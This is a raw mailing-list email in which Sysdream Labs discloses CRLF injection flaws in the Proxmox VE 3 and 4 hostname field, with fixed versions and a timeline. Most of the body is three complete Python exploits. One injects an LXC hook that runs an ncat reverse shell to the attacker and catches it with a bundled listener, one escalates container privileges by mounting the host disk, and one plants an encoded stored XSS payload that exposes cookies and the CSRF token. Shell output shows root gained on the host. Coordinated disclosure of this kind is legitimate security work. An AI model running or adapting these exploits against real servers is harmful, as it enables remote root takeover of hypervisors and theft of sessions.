X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["20055" "Thursday" "25" "February" "2016" "11:16:25" "+0100" "Sysdream Labs" "labs@sysdream.com" "<56CED479.8020502@sysdream.com>" "527" "[oss-security] CVE ID Request : Proxmox VE Insecure hostname checking (remote root exploit)" nil nil nil "2" "2016022510:16:25" "[oss-security] CVE ID Request : Proxmox VE Insecure hostname checking (remote root exploit)" (number mark "U       labs@sysdrea Feb 25  527/20055 " thread-indent "\"[oss-security] CVE ID Request : Proxmox VE Insecure hostname checking (remote root exploit)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28476 invoked by uid 550); 25 Feb 2016 10:39:35 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13795 invoked from network); 25 Feb 2016 10:16:45 -0000
X-Virus-Scanned: amavisd-new at sysdream.com
To: OSS Security <oss-security@lists.openwall.com>
Cc: fulldisclosure@seclists.org
From: Sysdream Labs <labs@sysdream.com>
Message-ID: <56CED479.8020502@sysdream.com>
Date: Thu, 25 Feb 2016 11:16:25 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.6.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="qokrFpCiILqtvIFJs30VTRonTK9SFSH20"
Subject: [oss-security] CVE ID Request : Proxmox VE Insecure hostname checking (remote root
 exploit)

--qokrFpCiILqtvIFJs30VTRonTK9SFSH20
Content-Type: multipart/mixed; boundary="nvmDTivVl9T8WTIaibho5PKCFRGaKwTAg"
From: Sysdream Labs <labs@sysdream.com>
To: OSS Security <oss-security@lists.openwall.com>
Cc: fulldisclosure@seclists.org
Message-ID: <56CED479.8020502@sysdream.com>
Subject: CVE ID Request : Proxmox VE Insecure hostname checking (remote root
 exploit)

--nvmDTivVl9T8WTIaibho5PKCFRGaKwTAg
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Proxmox VE 3/4 Insecure Hostname Checking (Remote Root Exploit, XSS,
Privileges escalation)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Description
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Proxmox is a popular virtualization solution based on KVM and Linux
containers.

A critical vulnerability has been found in Proxmox VE 3 (OpenVZ) and
Proxmox VE 4 beta 1 (LXC) in the
virtual machine creating form allowing authenticated remote users to
overwrite configuration files settings.


Configuration file overwriting
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D

Because the Proxmox VE application doesn't check the
user-provided "hostname" POST parameter, it's
possible to overwrite configuration files using a CRLF injection.
In Proxmox VE 3, we successfully gained access to the host filesystem
from a container and elevated our container capabilities, allowing us to
obtain user credentials and sniff the network.
In Proxmox VE 4b1, because LXC allows "hooks" to execute commands, we
successfully gained root privileges on the host.
It's also possible to exploit Proxmox clusters.

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-915

Proof of Concept
----------------

The following exploit works for Proxmox VE 4 beta 1. The
lxc.hook.pre-start configuration variable is used to trigger the ncat
reverse-shell payload when the container is started.

    #!/usr/bin/env python

    import requests
    import socket
    import telnetlib
    from threading import Thread
    import argparse
    from time import sleep

    def exploit(target, username, password, vmid, template, realm,
reverse, hostname):
        payload =3D "ncat %s %s -e /bin/sh" % reverse

        print "[~] Obtaining authorization key..."
        apireq =3D requests.post("https://%s/api2/extjs/access/ticket" %
target,
                               verify=3DFalse,
                               data=3D{"username": username,
                                     "password": password,
                                     "realm": realm})
        response =3D apireq.json()
        if "success" in response and response["success"]:
            print "[+] Authentication success."
            ticket =3D response["data"]["ticket"]
            csrfticket =3D response["data"]["CSRFPreventionToken"]
            createvm =3D
requests.post("https://%s/api2/extjs/nodes/%s/lxc" % (target, hostname),
                                     verify=3DFalse,
                                     headers=3D{"CSRFPreventionToken":
csrfticket},
                                     cookies=3D{"PVEAuthCookie": ticket},
                                     data=3D{"vmid": vmid,

"hostname":"sysdream\nlxc.hook.pre-start=3D%s &&" % payload,
                                           "storage": "local",
                                           "password": "sysdream",
                                           "ostemplate": template,
                                           "memory": 512,
                                           "swap": 512,
                                           "disk": 2,
                                           "cpulimit": 1,
                                           "cpuunits": 1024,
                                           "net0":"name=3Deth0"})
            if createvm.status_code =3D=3D 200:
                response =3D createvm.json()
                if "success" in response and response["success"]:
                    print "[+] Container Created... (Sleeping 20 seconds)"
                    sleep(20)
                    print "[+] Starting container..."
                    startcontainer =3D
requests.post("https://%s/api2/extjs/nodes/%s/lxc/%s/status/start" %
(target, hostname, vmid), verify=3DFalse, headers=3D{"CSRFPreventionToken":
csrfticket}, cookies=3D{"PVEAuthCookie": ticket})
                    if startcontainer.status_code =3D=3D 200:
                        response =3D startcontainer.json()
                        if "success" in response and response["success"]:
                            print "[+] Exploit should be working..."
                        else:
                            print "[!] Can't start container ! Try to
start it manually."
                else:
                    print "[!] Error creating container..."
                    print response
            else:
                print "[!] Error creating Container. Bad HTTP Status
code : %d" % createvm.status_code
        else:
            print "[!] Authentication failed - Check the credentials..."

    def handler(lport):
        print "[~] Starting handler on port %d" % lport
        t =3D telnetlib.Telnet()
        s =3D socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", lport))
        s.listen(1)
        conn, addr =3D s.accept()

        print "[+] Connection from %s" % addr[0]

        t.sock =3D conn

        print "[+] Pop the shell ! :)"

        t.interact()

    if __name__ =3D=3D "__main__":
        print "[~] Proxmox VE 4.0b1 Authenticated Root Exploit - Nicolas
Chatelain <n.chatelain[at]sysdream.com>\n"

        parser =3D argparse.ArgumentParser()
        parser.add_argument("--target", required=3DTrue, help=3D"The target
host (eg : 10.0.0.1:8006)")

        parser.add_argument("--username", required=3DTrue)
        parser.add_argument("--password", required=3DTrue)

        parser.add_argument("--localhost", required=3DTrue, help=3D"Local
host IP for the connect-back shell.")
        parser.add_argument("--localport", required=3DTrue, type=3Dint,
help=3D"Local port for local bind handler")

        parser.add_argument("--vmid", required=3DFalse, default=3D"999",
type=3Dint, help=3D"A unique ID for the container, exploit will fail if the
ID already exists.")

        parser.add_argument("--template", required=3DFalse,
default=3D"local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz",
                            help=3D"An existing template in the hypervisor "
                                 "(default :
local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz)")

        parser.add_argument("--realm", required=3DFalse, default=3D"pam",
choices=3D["pve", "pam"])

        parser.add_argument("--hostname", required=3DTrue, help=3D"The
target hostname")

        args =3D parser.parse_args()

        handlerthr =3D Thread(target=3Dhandler, args=3D(args.localport,))
        handlerthr.start()

        exploitthr =3D Thread(target=3Dexploit, args=3D(args.target,
args.username, args.password, args.vmid, args.template, args.realm,
(args.localhost, args.localport), args.hostname))
        exploitthr.start()

        handlerthr.join()

Shell output :

    nightlydev@nworkstation ~/Lab/Proxmox_Exploits $ python
remoteroot.py --target 10.25.0.101:8006 --username nicolas --password
pveuser --localhost 10.25.0.10 --localport 9999 --vmid 456 --realm pve
--hostname pve4
    [~] Proxmox VE 4.0b1 Authenticated Root Exploit - Nicolas Chatelain
<n.chatelain[at]sysdream.com>
    [~] Starting handler on port 9999
    [~] Obtaining authorization key...
    [+] Authentication success.
    [+] Container Created... (Sleeping 20 seconds)
    [+] Exploit should be working...
    [+] Connection from 10.25.0.101
    [+] Pop the shell !
    whoami
    root
    id
    uid=3D0(root) gid=3D0(root) groups=3D0(root)

The following exploit works for Proxmox VE 3. This proof of concept
mount the host /dev/dm-0 on the container and add multiples capabilities
on the container.


    #!/usr/bin/env python

    import requests
    import socket
    import telnetlib
    from threading import Thread
    import argparse

    def exploit(target, username, password, vmid, template, realm,
hostname):
        payload =3D "sysdream\"\nDEVNODES=3D\"dm-0:r
\"\nCAPABILITIES=3D\"mknod:on, sys_chroot:on, sys_rawio: on, net_admin:on,
dac_override:on\"\n#"
        print "[~] Obtaining authorization key..."
        apireq =3D requests.post("https://%s/api2/extjs/access/ticket" %
target,
                               verify=3DFalse,
                               data=3D{"username": username,
                                     "password": password,
                                     "realm": realm})
        response =3D apireq.json()
        if "success" in response and response["success"]:
            print "[+] Authentication success."
            ticket =3D response["data"]["ticket"]
            csrfticket =3D response["data"]["CSRFPreventionToken"]
            createvm =3D
requests.post("https://%s/api2/extjs/nodes/%s/openvz" % (target, hostname),
                                     verify=3DFalse,
                                     headers=3D{"CSRFPreventionToken":
csrfticket},
                                     cookies=3D{"PVEAuthCookie": ticket},
                                     data=3D{"vmid": vmid,
                                           "hostname": payload,
                                           "storage": "local",
                                           "password": "sysdream",
                                           "ostemplate": template,
                                           "memory": 512,
                                           "swap": 512,
                                           "disk": 2,
                                           "cpus": 1,

"netif":"ifname=3Deth0,bridge=3Dvmbr0"})
            if createvm.status_code =3D=3D 200:
                response =3D createvm.json()
                if "success" in response and response["success"]:
                    print "[+] Countainer (Capabilities + DM-0 Mount)
Created."
                else:
                    print "[!] Error creating container..."
                    print response
            else:
                print "[!] Error creating Container. Bad HTTP Status
code : %d" % createvm.status_code
        else:
            print "[!] Authentication failed - Check the credentials..."

    if __name__ =3D=3D "__main__":
        print "[~] Proxmox VE 3 Authenticated Privileges Escalation
Exploit - Nicolas Chatelain <n.chatelain[at]sysdream.com>\n"

        parser =3D argparse.ArgumentParser()
        parser.add_argument("--target", required=3DTrue, help=3D"The target
host (eg : 10.0.0.1:8006)")

        parser.add_argument("--username", required=3DTrue)
        parser.add_argument("--password", required=3DTrue)

        parser.add_argument("--vmid", required=3DFalse, default=3D"999",
type=3Dint, help=3D"A unique ID for the container, exploit will fail if the
ID already exists.")

        parser.add_argument("--template", required=3DFalse,
default=3D"local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz",
                            help=3D"An existing template in the hypervisor
(default : local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz)")

        parser.add_argument("--hostname", required=3DTrue, help=3D"The
target hostname")

        parser.add_argument("--realm", required=3DFalse, default=3D"pam",
choices=3D["pve", "pam"])

        args =3D parser.parse_args()

        exploit(args.target, args.username, args.password, args.vmid,
args.template, args.realm, args.hostname)

Shell output :

    nightlydev@nworkstation ~/Lab/Proxmox_Exploits $ python
privescalation.py --username root --password sysofdream --vmid 123
--realm pam --target 10.25.0.110:8006 --hostname pve3
    [~] Proxmox VE 3 Authenticated Privileges Escalation Exploit -
Nicolas Chatelain <n.chatelain[at]sysdream.com>

    [~] Obtaining authorization key...
    [+] Authentication success.
    [+] Countainer (Capabilities + DM-0 Mount) Created.

-- On container :

    root@sysdream:/# ls -lah /dev/dm-0
    brw-r----T 1 root root 253, 0 Aug 23 00:33 /dev/dm-0

---
Stored Cross-Site Scripting
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D

Same vulnerability, different usage. Works on Proxmox 3 and Proxmox 4b1.

**Access Vector**: remote

**Security Risk**: high


Proof of Concept
----------------

The following exploit will create a stored XSS displaying the user
cookies and the PVE CSRFPreventionToken.


    #!/usr/bin/env python

    import requests
    import socket
    import telnetlib
    from threading import Thread
    import argparse

    def exploit(target, username, password, vmid, template, realm,
version, hostname):
        payload =3D
"eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,=
116,46,99,111,111,107,105,101,43,34,45,34,32,43,32,80,86,69,46,67,83,82,70,=
80,114,101,118,101,110,116,105,111,110,84,111,107,101,110,41,59))"
        print "[~] Obtaining authorization key..."
        apireq =3D requests.post("https://%s/api2/extjs/access/ticket" %
target,
                               verify=3DFalse,
                               data=3D{"username": username,
                                     "password": password,
                                     "realm": realm})
        response =3D apireq.json()
        if "success" in response and response["success"]:
            print "[+] Authentication success."
            ticket =3D response["data"]["ticket"]
            csrfticket =3D response["data"]["CSRFPreventionToken"]
            if version =3D=3D "4":
                createvm =3D
requests.post("https://%s/api2/extjs/nodes/%s/lxc" % (target, hostname),
                                         verify=3DFalse,
                                         headers=3D{"CSRFPreventionToken":
csrfticket},
                                         cookies=3D{"PVEAuthCookie": ticket=
},
                                         data=3D{"vmid": vmid,

"hostname":"<img/src=3D'x'/onerror=3D%s>" % payload,
                                               "storage": "local",
                                               "password": "sysdream",
                                               "ostemplate": template,
                                               "memory": 512,
                                               "swap": 512,
                                               "disk": 2,
                                               "cpulimit": 1,
                                               "cpuunits": 1024,
                                               "net0":"name=3Deth0"})
            elif version =3D=3D "3":
                   createvm =3D
requests.post("https://%s/api2/extjs/nodes/%s/openvz" % (target, hostname),
                                         verify=3DFalse,
headers=3D{"CSRFPreventionToken": csrfticket},
                                         cookies=3D{"PVEAuthCookie": ticket=
},
                                         data=3D{"vmid": vmid,

"hostname":"<img/src=3D'x'/onerror=3D%s>" % payload,
                                               "storage": "local",
                                               "password": "sysdream",
                                               "ostemplate": template,
                                               "memory": 512,
                                               "swap": 512,
                                               "disk": 2,
                                               "cpus": 1,

"netif":"ifname=3Deth0,bridge=3Dvmbr0"})
            if createvm.status_code =3D=3D 200:
                response =3D createvm.json()
                if "success" in response and response["success"]:
                    print "[+] Stored XSS Created."
                else:
                    print "[!] Error creating container..."
                    print response
            else:
                print "[!] Error creating Container. Bad HTTP Status
code : %d" % createvm.status_code
        else:
            print "[!] Authentication failed - Check the credentials..."

    if __name__ =3D=3D "__main__":
        print "[~] Proxmox VE 3/4b1 Stored Cross Site Scripting -
Nicolas Chatelain <n.chatelain[at]sysdream.com>\n"

        parser =3D argparse.ArgumentParser()
        parser.add_argument("--target", required=3DTrue, help=3D"The target
host (eg : 10.0.0.1:8006)")

        parser.add_argument("--username", required=3DTrue)
        parser.add_argument("--password", required=3DTrue)

        parser.add_argument("--vmid", required=3DFalse, default=3D"999",
type=3Dint, help=3D"A unique ID for the container, exploit will fail if the
ID already exists.")

        parser.add_argument("--template", required=3DFalse,
default=3D"local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz",
                            help=3D"An existing template in the hypervisor
(default : local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz)")

        parser.add_argument("--realm", required=3DFalse, default=3D"pam",
choices=3D["pve", "pam"])

        parser.add_argument("--version", default=3D"3", choices=3D["3",
"4"], help=3D"The Proxmox version to exploit")

        parser.add_argument("--hostname", required=3DTrue, help=3D"The
target hostname")

        args =3D parser.parse_args()

        exploit(args.target, args.username, args.password, args.vmid,
args.template, args.realm, args.version, args.hostname)

---------------
Vulnerable code
---------------

The vulnerable code is located in the /usr/share/perl5/PVE/LXC.pm for
Proxmox 4.

For Proxmox 3, the vulnerable code is located in
/usr/share/perl5/PVE/OpenVZ.pm.

--------
Solution
--------

Proxmox 4 : Update to pve-container 0.9-22

Proxmox 3 : Update to pve-manager 3.4-10

Timeline (dd/mm/yyyy)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

04/09/2015 : Initial discovery.
17/09/2015 : Contact with proxmox team.
18/09/2015 : Proxmox fixes the vulnerabilities.
18/09/2015 : Proxmox releases a new pve-container version (0.9-22)
18/09/2015 : Proxmox releases a new pve-manager version (3.4-10)

Affected versions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

* Proxmox VE 4
* Proxmox VE 3


Credits
=3D=3D=3D=3D=3D=3D=3D

* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)


--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--nvmDTivVl9T8WTIaibho5PKCFRGaKwTAg--

--qokrFpCiILqtvIFJs30VTRonTK9SFSH20
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJWztR6AAoJEI60jNnVslmhlEAP/idyJx/6z/c3EkjxC/LELejn
Iu+Uxjh0fdheGDGkrDr87SvfL/k2zUSHWfA+5Uqkj/NEq88mgsqQdvQkjlIBY2O6
QyqAJnJc0jfHA9wmWeiSrsv9LGiFVp35UenRkct+mEP4esbrazkyEFTdw+lcunZ3
hODoGCfzBLqG0H3evbZNixPCKt3IhqdG51Tc4ZG6J+N15K7LOrptmy1zk5BqroBl
nMNUvvrS4Ed8LglEEgMGlN4JOSIDSWGL9H3mXBRg3T3ZTdMWVUC/IRMFfdEwZ3Ru
4fLKyWXBn7JTgheEmlbFGdhti2+NvhL3FipVV//oEpTHb2j2JHX7DyZAS6Vn1ANv
RRC0JYvGasSWafShrUb6Cx56Q3p1wGnxUoWqnIl8M1mjLs2mOd1Ik/4FBIm+Ckte
tf6RcfWdGoAF3nwX2+K2gxSCZ44Q74wRqDJMwaPfdg7nzAaRqAcy4Hxg3d5p4x/m
nEqIhldpcTiWhSkCp3yQVGoCJKHFRmIOi/Jpyd5wwz6zWR67XqNEGEjRXXm8K/ns
poiWP48JShe2XlGs6oEjynCRztqLQojlD98iNS0r5oYvx3AemxcYbdlvApXKY5c8
l1oSijod5MI87/c7EDcvCbXLmpCTv4R6WNsezMtl+TH4Ohre22rt+/bIk90ui6Rh
Av2Q4XXFv7k/Lfn0LUA0
=y88E
-----END PGP SIGNATURE-----

--qokrFpCiILqtvIFJs30VTRonTK9SFSH20--
